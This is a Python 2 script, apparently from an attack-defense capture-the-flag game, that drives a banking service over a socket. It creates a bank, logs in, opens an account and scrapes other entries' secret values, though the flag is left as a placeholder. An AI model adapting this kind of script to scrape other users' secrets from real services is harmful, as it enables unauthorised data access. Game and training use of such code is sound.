import sys

class Exploit():

    def createBank(self):
        import re,socket,binascii,random,string
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip,self.port))
        print "Elso: "+s.recv(4024)
        print "Masodik: "+s.recv(4024)

        s.send("04\n")

        print s.recv(1024)
        print s.recv(1024)

        self.bank_name=''.join(random.choice(string.ascii_uppercase) for x in range(16))
        print s.send(self.bank_name+"\n")

        print s.recv(1024)

        self.CFO=''.join(random.choice(string.ascii_uppercase) for x in range(16))

        s.send(self.CFO+"\n")

        self.PIN=''.join(random.choice(string.digits) for x in range(4))
        s.send(self.PIN+"\n")
        print s.recv(1024)
        print s.recv(1024)
        s.close()

    def mothersName(self,s):
        import re,socket,binascii,random,string
        s.send("06\n")
        print s.recv(1024)
        banks=s.recv(1024).split("\n")
        print repr(banks)
        self.banks={}
        for i in range(0,len(banks)):
            if banks[i].find("DX")==0:
                self.banks[banks[i]]=banks[i+2]
            i=i+1
        print repr(self.banks)

    def openAccount(self,s):
        import re,socket,binascii,random,string
        s.send("03\n")

        print s.recv(1024)
        print s.recv(1024)
        s.send(self.bank_name+"\n")
        print s.recv(1024)
        self.bank_user_name=''.join(random.choice(string.ascii_uppercase) for x in range(16))
        s.send(self.bank_user_name+"\n")
        print s.recv(1024)
        self.bank_user_PIN=''.join(random.choice(string.digits) for x in range(16))
        s.send(self.bank_user_PIN+"\n")
        print s.recv(1024)
        s.send("00\n")
        print s.recv(1024)

        print s.recv(1024)
        
        s.send("\n")
        print s.recv(1024)
        print s.recv(1024)
        
        self.mothersName(s)


    def logIn(self):
        import re,socket,binascii,random,string
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip,self.port))
        print "Elso: "+s.recv(4024)
        print "Masodik: "+s.recv(4024)

        s.send("05\n")

        print s.recv(1024)
        print s.recv(1024)

        s.send(self.CFO+"\n")

        print s.recv(1024)        

        s.send(self.PIN+"\n")

        print s.recv(1024)               
        print s.recv(1024)               
        s.send("x\n")

        print s.recv(1024)               
        print s.recv(1024)               
        self.openAccount(s)
        s.close()

    def execute(self,ip,port,flag_id):
        import re,socket,binascii,random,string
        self.ip=ip
        self.port=port
        self.createBank()
        self.logIn()
        for dx in self.banks:
            print dx
            
        self.flag="PLEASESETME"

    def result(self):
        return {'FLAG' : self.flag }

e=Exploit()
#e.execute("10.105.0.54",8888,"")
e.execute("10.105.0.54",2583,"")

#10.13.37.49
print e.result()